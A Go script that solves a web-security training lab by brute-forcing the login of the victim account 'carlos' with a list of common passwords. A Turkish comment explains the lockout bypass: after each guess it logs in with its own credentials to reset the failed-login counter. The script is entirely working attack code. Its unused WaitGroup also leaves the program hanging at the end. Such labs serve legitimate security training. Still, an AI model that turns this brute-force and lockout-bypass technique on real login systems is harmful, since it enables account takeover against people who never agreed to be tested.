package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
)

var (
	url_           = "https://ac2b1f7f1ff7bdccc0605a0300b3001d.web-security-academy.net/login"
	session        = "rA9f5spjp7EQeBuCstuMTazP4hfUNfEM"
	keylist        = []string{"123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"}
	mainUserName   = "wiener"
	mainPassword   = "peter"
	victimUserName = "carlos"
)

/*
Burada brute force işlemini sağlıklı bir şekilde gerçekleştirmek için 3 istekte bir kendi kullanıcımızla giriş yapmalıyız ki yanlış girilen sayaç bilgisi sıfırlansın

*/

func main() {

	var wg sync.WaitGroup
	wg.Add(100)
	for _, c := range keylist {

		sendReq(mainUserName, mainPassword)
		res := sendReq(victimUserName, c)
		fmt.Println(res + " " + c)
		if res == "302 Found" {
			fmt.Println("FOUND " + c)
		}

	}

	wg.Wait()
	fmt.Println("END!")

}

func sendReq(username string, password string) string {
	//302 handle edebilmek için
	client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	postData := url.Values{}
	postData.Set("username", username)
	postData.Set("password", password)
	req, _ := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))

	req.Header.Add("Cookie", "session="+session)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	return string(res.Status)

}
